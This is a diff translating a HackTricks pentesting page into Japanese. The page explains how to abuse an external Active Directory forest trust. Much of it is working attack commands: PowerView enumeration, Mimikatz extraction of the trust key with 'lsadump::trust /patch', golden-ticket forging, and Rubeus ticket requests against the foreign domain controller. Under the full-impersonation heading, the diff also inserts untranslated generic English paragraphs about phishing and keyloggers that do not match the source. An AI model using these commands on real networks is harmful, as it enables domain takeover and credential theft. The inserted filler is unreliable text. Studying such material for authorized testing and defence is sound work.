@@ -1,37 +1,36 @@
-# External Forest Domain - OneWay (Inbound) or bidirectional
+# 外部フォレストドメイン - 単方向（インバウンド）または双方向
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
+* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
+* **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。**
 
 </details>
 
-In this scenario an external domain is trusting you (or both are trusting each other), so you can get some kind of access over it.
+このシナリオでは、外部ドメインがあなたを信頼しています（またはお互いを信頼しています）、そのためある種のアクセスを取得できます。
 
-## Enumeration
+## 列挙
 
-First of all, you need to **enumerate** the **trust**:
-
+まず、**信頼関係**を**列挙**する必要があります：
 ```powershell
 Get-DomainTrust
 SourceName      : a.domain.local   --> Current domain
 TargetName      : domain.external  --> Destination domain
 TrustType       : WINDOWS-ACTIVE_DIRECTORY
-TrustAttributes : 
+TrustAttributes :
 TrustDirection  : Inbound          --> Inboud trust
 WhenCreated     : 2/19/2021 10:50:56 PM
 WhenChanged     : 2/19/2021 10:50:56 PM
 
 # Get name of DC of the other domain
 Get-DomainComputer -Domain domain.external -Properties DNSHostName
-dnshostname           
------------           
+dnshostname
+-----------
 dc.domain.external
 
 # Groups that contain users outside of its domain and return its members
@@ -42,7 +41,7 @@ GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
 MemberDomain            : domain.external
 MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
 MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
-                          DC=external
+DC=external
 
 # Get name of the principal in the current domain member of the cross-domain group
 ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
@@ -64,52 +63,41 @@ SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
 IsGroup      : True
 IsDomain     : True
 
-# You may also enumerate where foreign groups and/or users have been assigned 
+# You may also enumerate where foreign groups and/or users have been assigned
 # local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
 ```
+前の列挙で、ユーザー**`crossuser`**が**`External Admins`**グループに所属しており、**外部ドメインのDC**で**管理者アクセス**を持っていることがわかりました。
 
-In the previous enumeration it was found that the user **`crossuser`** is inside the **`External Admins`** group who has **Admin access** inside the **DC of the external domain**.
+## 初期アクセス
 
-## Initial Access
+他のドメインでユーザーの特別なアクセス権限を見つけることができなかった場合、AD Methodologyに戻って**特権のないユーザーからの特権昇格**を試すことができます（例えば、kerberoastingなど）：
 
-If you **couldn't** find any **special** access of your user in the other domain, you can still go back to the AD Methodology and try to **privesc from an unprivileged user** (things like kerberoasting for example):
-
-You can use **Powerview functions** to **enumerate** the **other domain** using the `-Domain` param like in:
-
+`-Domain`パラメータを使用して、**Powerview関数**を使用して**他のドメイン**を列挙することができます。例：
 ```powershell
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ```
+## 偽装
 
-{% content-ref url="./" %}
-[.](./)
-{% endcontent-ref %}
+### ログイン
 
-## Impersonation
-
-### Logging in
-
-Using a regular method with the credentials of the users who is has access to the external domain you should be able to access:
-
+外部ドメインにアクセス権限を持つユーザーの資格情報を使用して通常の方法でアクセスできるはずです。
 ```powershell
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
+### SID Historyの悪用
 
-### SID History Abuse
+フォレスト間の信頼関係を利用して、[**SID History**](sid-history-injection.md)を悪用することもできます。
 
-You could also abuse [**SID History**](sid-history-injection.md) across a forest trust.
-
-If a user is migrated **from one forest to another** and **SID Filtering is not enabled**, it becomes possible to **add a SID from the other forest**, and this **SID** will be **added** to the **user's token** when authenticating **across the trust**.
+ユーザーが**1つのフォレストから別のフォレストに移行**され、**SIDフィルタリングが有効にされていない**場合、**他のフォレストからSIDを追加**することが可能になります。そして、この**SID**は、**信頼関係を介して認証**する際に、**ユーザーのトークンに追加**されます。
 
 {% hint style="warning" %}
-As a reminder, you can get the signing key with
-
+注意として、署名キーを取得することができます。
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 ```
 {% endhint %}
 
-You could **sign with** the **trusted** key a **TGT impersonating** the user of the current domain.
-
+現在のドメインのユーザーをなりすまし、信頼されたキーでTGTに署名することができます。
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
 Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
@@ -120,9 +108,15 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
+### ユーザーの完全ななりすまし方法
 
-### Full way impersonating the user
+In this technique, we will impersonate the user in order to gain full access to their account and perform actions on their behalf. This method requires administrative privileges and can be used to bypass security measures and gain unauthorized access to sensitive information.
 
+To impersonate the user, we will need to obtain their credentials, such as their username and password. This can be done through various means, such as phishing attacks, keyloggers, or password cracking techniques.
+
+Once we have obtained the user's credentials, we can use them to log in to their account and gain full access. This allows us to perform actions on their behalf, such as accessing their files, sending emails, or even making changes to their account settings.
+
+It is important to note that impersonating a user without their consent is illegal and unethical. This technique should only be used for legitimate purposes, such as penetration testing or authorized security audits.
 ```bash
 # Get a TGT of the user with cross-domain permissions
 Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap
@@ -136,15 +130,14 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
+* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。
 
 </details>
